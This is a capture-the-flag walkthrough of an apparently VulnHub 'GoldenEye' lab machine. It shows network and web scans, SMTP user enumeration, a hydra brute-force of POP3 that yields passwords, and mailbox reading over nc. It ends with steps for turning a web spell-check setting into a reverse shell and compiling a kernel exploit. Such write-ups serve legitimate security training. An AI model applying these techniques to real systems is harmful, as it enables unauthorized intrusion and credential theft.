# Information Gathering

## 1. netdiscover

```sh
root@kali:~# netdiscover -r 192.168.56.0/24
```
```
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
                                                                                                                                                             
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                                                            
 192.168.56.100  08:00:27:8f:17:07      1      60  PCS Systemtechnik GmbH                                                                                    
 192.168.56.103  08:00:27:3b:86:3c      1      60  PCS Systemtechnik GmbH                                                                                    
```

## 2. nmap

Quick Scan

```
root@kali:~# nmap -sV 192.168.56.103
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-24 10:25 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.103
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.16 seconds
```

Full Scan
```
root@kali:~# nmap -sV -p1-65535 192.168.56.103
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-24 10:27 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.103
Host is up (0.013s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d
MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.47 seconds
```

# Vulnerability Analysis

Web App scanning
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2018-10-24 10:31:06 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xfc 0x56aba821be9ed 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.24
+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2018-10-24 10:32:13 (GMT-4) (67 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

In `http://192.168.56.103/terminal.js`
```
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```
```python
import html
html.unescape('&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;')

'InvincibleHack3r'
```
Website at http://192.168.56.103 says go to /sev-home/ to login


## SMTP enumeration
Manual way
```
root@kali:~# telnet 192.168.56.103 25
Trying 192.168.56.103...
Connected to 192.168.56.103.
Escape character is '^]'.
220 ubuntu GoldentEye SMTP Electronic-Mail agent
vrfy sys
252 2.0.0 sys
vrfy admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
vrfy administrator
550 5.1.1 <administrator>: Recipient address rejected: User unknown in local recipient table
vrfy root
252 2.0.0 root
vrfy boris
252 2.0.0 boris
vrfy janus
550 5.1.1 <janus>: Recipient address rejected: User unknown in local recipient table
vrfy xenia
550 5.1.1 <xenia>: Recipient address rejected: User unknown in local recipient table
vrfy natalya
252 2.0.0 natalya
```
Scripted way
```
root@kali:~# smtp-user-enum -U /usr/share/wordlists/fern-wifi/common.txt -t 192.168.56.103
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/fern-wifi-cracker/extras/wordlists/common.txt
Target count ............. 1
Username count ........... 478
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Oct 24 10:45:40 2018 #########
 exists.56.103: lp
 exists.56.103: root
 exists.56.103: sys
 exists.56.103: MAIL
 exists.56.103: Root
 exists.56.103: SYS
######## Scan completed at Wed Oct 24 10:45:45 2018 #########
6 results.

478 queries in 5 seconds (95.6 queries / sec)
```

## POP3 bruteforcing
```
root@kali:~# hydra -L logins.txt -P /usr/share/wordlists/fasttrack.txt pop3://192.168.56.103:55007
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-24 11:53:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 444 login tries (l:2/p:222), ~28 tries per task
[DATA] attacking pop3://192.168.56.103:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 364 to do in 00:05h, 16 active
[55007][pop3] host: 192.168.56.103   login: boris   password: secret1!
[STATUS] 90.33 tries/min, 271 tries in 00:03h, 173 to do in 00:02h, 16 active
[55007][pop3] host: 192.168.56.103   login: natalya   password: bird
1 of 1 target successfully completed, 2 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-24 11:57:44
```

## POP3 access
```
root@kali:~# nc 192.168.56.103 55007
+OK GoldenEye POP3 Electronic-Mail System
user boris
+OK
pass secret1!
+OK Logged in.
list
+OK 3 messages:
1 544
2 373
3 921
retr 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
```

```
root@kali:~# nc 192.168.56.103 55007
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.
```

Changed `/etc/hosts`, logged in using `xenia`
Checking private messages, found a message from `doak`

```
root@kali:~# nc 192.168.56.103 55007
+OK GoldenEye POP3 Electronic-Mail System
user doak
+OK
pass goat
+OK Logged in.
list
+OK 1 messages:
1 606
.
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
```

Found `s3cret.txt` in files in web site
File contents lead to `/dir007key/for-007.jpg`
Running `strings for-007.jpg` reveals `eFdpbnRlcjE5OTV4IQ==`
```sh
root@kali:~# base64 -d
eFdpbnRlcjE5OTV4IQ==
xWinter1995x!
```

1. Found setting in web site that configures command to execute for spell checking.
2. Change this command to a reverse shell command, experiment with which shell works (e.g. python, php etc.)
3. Change setting for spell checker to use PShellShell instead of Google Spell Check
4. `nc -lvp <port>`
5. `uname -a` to get kernel version.  Find relevant exploit on exploit-db.com
6. Compile exploit using `clang` instead of `gcc` which is not available
7. Remember landing page at the beginning that says the flag is in `/root`
